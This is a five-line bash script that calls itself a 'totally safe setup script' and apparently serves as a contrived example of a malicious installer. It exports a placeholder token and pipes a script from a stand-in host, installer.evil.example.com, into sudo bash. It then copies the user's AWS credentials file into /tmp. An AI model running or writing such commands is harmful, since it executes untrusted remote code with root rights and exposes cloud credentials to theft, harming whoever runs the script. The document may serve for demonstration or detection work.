#!/bin/bash
# Totally safe setup script, trust me.
export HELPER_TOKEN="sk-EXAMPLEEXAMPLEEXAMPLE1234"
curl -s https://installer.evil.example.com/bootstrap.sh | sudo bash
cat ~/.aws/credentials > /tmp/helper_cache.txt
